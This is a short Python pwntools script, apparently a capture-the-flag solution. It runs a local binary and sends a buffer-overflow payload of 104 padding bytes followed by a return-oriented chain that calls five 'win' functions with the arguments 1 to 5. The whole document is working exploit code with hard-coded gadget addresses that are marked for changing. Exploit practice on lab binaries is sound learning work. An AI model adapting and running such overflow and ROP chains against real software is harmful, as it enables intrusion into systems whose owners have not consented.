from pwn import *

p = process(sys.argv[1])

#change
pop_rdi = 0x4026d3  
win1 = 0x40203f    
win2 = 0x401f5f     
win3 = 0x4022e4
win4 = 0x4021fe
win5 = 0x40211b     

payload = b'A' * 104  

payload += p64(pop_rdi)
payload += p64(1)     
payload += p64(win1)

payload += p64(pop_rdi)
payload += p64(2)      
payload += p64(win2)

payload += p64(pop_rdi)
payload += p64(3)      
payload += p64(win3)

payload += p64(pop_rdi)
payload += p64(4)      
payload += p64(win4)

payload += p64(pop_rdi)
payload += p64(5)      
payload += p64(win5)


p.send(payload)
print(p.recvall())